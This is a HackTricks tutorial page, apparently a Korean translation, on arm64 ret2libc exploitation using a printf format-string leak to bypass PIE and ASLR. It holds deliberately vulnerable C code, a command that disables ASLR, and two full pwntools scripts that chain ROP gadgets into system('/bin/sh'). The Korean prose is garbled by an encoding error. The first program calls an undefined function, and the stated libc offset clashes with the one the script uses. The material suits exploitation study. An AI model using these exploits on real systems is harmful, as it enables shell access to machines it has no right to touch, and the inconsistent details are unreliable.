# Ret2lib + Printf leak - arm64

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì—ì„œ <strong>AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong>!</summary>

ë‹¤ë¥¸ HackTricks ì§€ì› ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## Ret2lib - NX bypass with ROP (no ASLR)
```c
#include <stdio.h>

void bof()
{
char buf[100];
printf("\nbof>\n");
fgets(buf, sizeof(buf)*3, stdin);
}

void main()
{
printfleak();
bof();
}
```
ìºë„ˆë¦¬ ì—†ì´ ì»´íŒŒì¼í•˜ê¸°:
```bash
clang -o rop-no-aslr rop-no-aslr.c -fno-stack-protector
# Disable aslr
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
### ì˜¤í”„ì…‹ ì°¾ê¸°

### x30 ì˜¤í”„ì…‹

**`pattern create 200`**ì„ ì‚¬ìš©í•˜ì—¬ íŒ¨í„´ì„ ìƒì„±í•˜ê³ , **`pattern search $x30`**ìœ¼ë¡œ ì˜¤í”„ì…‹ì„ í™•ì¸í•˜ë©´ ì˜¤í”„ì…‹ì´ **`108`** (0x6c)ì„ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<figure><img src="../../../.gitbook/assets/image (1215).png" alt="" width="563"><figcaption></figcaption></figure>

ë©”ì¸ í•¨ìˆ˜ë¥¼ í™•ì¸í•˜ë©´ ì´ì§„ íŒŒì¼ì´ ë¡œë“œëœ ìœ„ì¹˜ë¡œë¶€í„° **`printf`**ë¡œ ì§ì ‘ ì´ë™í•˜ëŠ” ëª…ë ¹ì–´ë¡œ **`jump`**í•˜ê³  ì‹¶ì–´í•©ë‹ˆë‹¤. **`printf`**ê¹Œì§€ì˜ ì˜¤í”„ì…‹ì€ **`0x860`**ì…ë‹ˆë‹¤.

<figure><img src="../../../.gitbook/assets/image (1216).png" alt=""><figcaption></figcaption></figure>

### system ë° `/bin/sh` ë¬¸ìì—´ ì°¾ê¸°

ASLRì´ ë¹„í™œì„±í™”ë˜ì–´ ìˆìœ¼ë¯€ë¡œ ì£¼ì†ŒëŠ” í•­ìƒ ë™ì¼í•©ë‹ˆë‹¤.

<figure><img src="../../../.gitbook/assets/image (1219).png" alt=""><figcaption></figcaption></figure>

### ê°€ì ¯ ì°¾ê¸°

**`x0`**ì—ëŠ” **`/bin/sh`** ë¬¸ìì—´ì˜ ì£¼ì†Œë¥¼ ê°€ì ¸ì™€ì•¼í•˜ë©° **`system`**ì„ í˜¸ì¶œí•´ì•¼í•©ë‹ˆë‹¤.

rooperë¥¼ ì‚¬ìš©í•˜ì—¬ í¥ë¯¸ë¡œìš´ ê°€ì ¯ì„ ì°¾ì•˜ìŠµë‹ˆë‹¤:
```
0x000000000006bdf0: ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;
```
### ì•…ìš©

ì´ ê°€ì ¯ì€ `$sp + 0x18`ì—ì„œ `x0`ì„ ë¡œë“œí•œ ë‹¤ìŒ spì—ì„œ x29 ë° x30 ì£¼ì†Œë¥¼ ë¡œë“œí•˜ì—¬ x30ìœ¼ë¡œ ì í”„í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ ê°€ì ¯ì„ ì‚¬ìš©í•˜ì—¬ **ì²« ë²ˆì§¸ ì¸ìˆ˜ë¥¼ ì œì–´í•œ ë‹¤ìŒ systemìœ¼ë¡œ ì í”„**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
from pwn import *
from time import sleep

p = process('./rop')  # For local binary
libc = ELF("/usr/lib/aarch64-linux-gnu/libc.so.6")
libc.address = 0x0000fffff7df0000
binsh = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
system = libc.sym["system"]

def expl_bof(payload):
p.recv()
p.sendline(payload)

# Ret2main
stack_offset = 108
ldr_x0_ret = p64(libc.address + 0x6bdf0) # ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;

x29 = b"AAAAAAAA"
x30 = p64(system)
fill = b"A" * (0x18 - 0x10)
x0 = p64(binsh)

payload = b"A"*stack_offset + ldr_x0_ret + x29 + x30 + fill + x0
p.sendline(payload)

p.interactive()
p.close()
```
## Ret2lib - NX, ASL ë° PIE ìš°íšŒ ë°©ë²•: ìŠ¤íƒì—ì„œ printf ëˆ„ì¶œ
```c
#include <stdio.h>

void printfleak()
{
char buf[100];
printf("\nPrintf>\n");
fgets(buf, sizeof(buf), stdin);
printf(buf);
}

void bof()
{
char buf[100];
printf("\nbof>\n");
fgets(buf, sizeof(buf)*3, stdin);
}

void main()
{
printfleak();
bof();
}

```
**ìºë„ˆë¦¬ ì—†ì´ ì»´íŒŒì¼í•˜ê¸°**:
```bash
clang -o rop rop.c -fno-stack-protector -Wno-format-security
```
### PIE ë° ASLRì´ì§€ë§Œ ìºë„ˆë¦¬ëŠ” ì—†ìŒ

* ë¼ìš´ë“œ 1:
* ìŠ¤íƒì—ì„œ PIE ëˆ„ì¶œ
* mainìœ¼ë¡œ ëŒì•„ê°€ê¸° ìœ„í•´ bof ì•…ìš©
* ë¼ìš´ë“œ 2:
* ìŠ¤íƒì—ì„œ libc ëˆ„ì¶œ
* ROP: ret2system

### Printf ëˆ„ì¶œ

printfë¥¼ í˜¸ì¶œí•˜ê¸° ì „ì— ì¤‘ë‹¨ì ì„ ì„¤ì •í•˜ë©´ ìŠ¤íƒì— ì´ì§„ íŒŒì¼ë¡œ ëŒì•„ê°ˆ ì£¼ì†Œì™€ libc ì£¼ì†Œê°€ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (1212).png" alt="" width="563"><figcaption></figcaption></figure>

ë‹¤ì–‘í•œ ì˜¤í”„ì…‹ì„ ì‹œë„í•˜ë©´ **`%21$p`**ê°€ ì´ì§„ ì£¼ì†Œë¥¼ ëˆ„ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (PIE ìš°íšŒ) ê·¸ë¦¬ê³  **`%25$p`**ê°€ libc ì£¼ì†Œë¥¼ ëˆ„ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (1220).png" alt="" width="440"><figcaption></figcaption></figure>

libc ëˆ„ì¶œëœ ì£¼ì†Œì—ì„œ libcì˜ ë² ì´ìŠ¤ ì£¼ì†Œë¥¼ ë¹¼ë©´ **ëˆ„ì¶œëœ ì£¼ì†Œì˜ ì˜¤í”„ì…‹ì€ `0x49c40`**ì„ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### x30 ì˜¤í”„ì…‹

ì´ì „ ì˜ˆì œì™€ ë™ì¼í•œ bofë¥¼ ì‚¬ìš©í•˜ë¯€ë¡œ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.

### ê°€ì ¯ ì°¾ê¸°

ì´ì „ ì˜ˆì œì™€ ë§ˆì°¬ê°€ì§€ë¡œ **`x0`**ì— **`/bin/sh`** ë¬¸ìì—´ ì£¼ì†Œë¥¼ ë„£ê³  **`system`**ì„ í˜¸ì¶œí•´ì•¼ í•©ë‹ˆë‹¤.

rooperë¥¼ ì‚¬ìš©í•˜ì—¬ ë˜ ë‹¤ë¥¸ í¥ë¯¸ë¡œìš´ ê°€ì ¯ì„ ì°¾ì•˜ìŠµë‹ˆë‹¤:
```
0x0000000000049c40: ldr x0, [sp, #0x78]; ldp x29, x30, [sp], #0xc0; ret;
```
ì´ ê°€ì ¯ì€ `$sp + 0x78`ì—ì„œ `x0`ì„ ë¡œë“œí•œ ë‹¤ìŒ spì—ì„œ x29 ë° x30 ì£¼ì†Œë¥¼ ë¡œë“œí•˜ì—¬ x30ìœ¼ë¡œ ì í”„í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ ê°€ì ¯ì„ ì‚¬ìš©í•˜ì—¬ **ì²« ë²ˆì§¸ ì¸ìˆ˜ë¥¼ ì œì–´í•œ ë‹¤ìŒ systemìœ¼ë¡œ ì í”„**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ê³µê²©
```python
from pwn import *
from time import sleep

p = process('./rop')  # For local binary
libc = ELF("/usr/lib/aarch64-linux-gnu/libc.so.6")

def leak_printf(payload, is_main_addr=False):
p.sendlineafter(b">\n" ,payload)
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
if is_main_addr:
response = response[:-4] + b"0000"
return int(response, 16)

def expl_bof(payload):
p.recv()
p.sendline(payload)

# Get main address
main_address = leak_printf(b"%21$p", True)
print(f"Bin address: {hex(main_address)}")

# Ret2main
stack_offset = 108
main_call_printf_offset = 0x860 #Offset inside main to call printfleak
print("Going back to " + str(hex(main_address + main_call_printf_offset)))
ret2main = b"A"*stack_offset + p64(main_address + main_call_printf_offset)
expl_bof(ret2main)

# libc
libc_base_address = leak_printf(b"%25$p") - 0x26dc4
libc.address = libc_base_address
print(f"Libc address: {hex(libc_base_address)}")
binsh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]

# ret2system
ldr_x0_ret = p64(libc.address + 0x49c40) # ldr x0, [sp, #0x78]; ldp x29, x30, [sp], #0xc0; ret;

x29 = b"AAAAAAAA"
x30 = p64(system)
fill = b"A" * (0x78 - 0x10)
x0 = p64(binsh)

payload = b"A"*stack_offset + ldr_x0_ret + x29 + x30 + fill + x0
p.sendline(payload)

p.interactive()
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong></summary>

ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê¸¸ ì›í•œë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ìš°ë¦¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ê·€í•˜ì˜ í•´í‚¹ ê¸°ìˆ ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
